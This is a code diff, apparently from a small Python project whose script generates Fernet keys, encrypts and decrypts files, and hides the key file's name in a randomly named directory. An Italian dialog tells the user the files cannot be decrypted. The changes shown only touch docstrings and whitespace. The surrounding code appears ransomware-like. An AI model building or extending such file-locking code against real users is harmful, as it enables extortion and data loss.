@@ -11,9 +11,7 @@ import random
 user=getpass.getuser()
 
 def write_key(nome="key"):
-    """
-    Generates a key and save it into a file!
-    """
+    """Generates a key and save it into a file!"""
     key = Fernet.generate_key()
     with open(nome+".key", "wb") as key_file:
         key_file.write(key)
@@ -30,8 +28,7 @@ def load_key(nome="key"):
         "impossibile decriptare i file ci dispiace")
         root.destroy()
         return e
-
-        
+       
 def encrypt(key,filename=None):
     try:
         f = Fernet(key)
@@ -76,14 +73,14 @@ def decrypt(key,filename=None,):
 
 
 def get_random_string(length):
-    """generate a name for file!"""
+    """Generate a name for file!"""
     letters = string.ascii_lowercase
     result_str = ''.join(random.choice(letters) for i in range(length))
     return result_str
 
 
 def RandomDirectory():
-    """save in a file the name of key file!"""
+    """Save in a file the name of key file!"""
     original=os.getcwd()
     nomee_file=get_random_string(42)
     user=getpass.getuser()
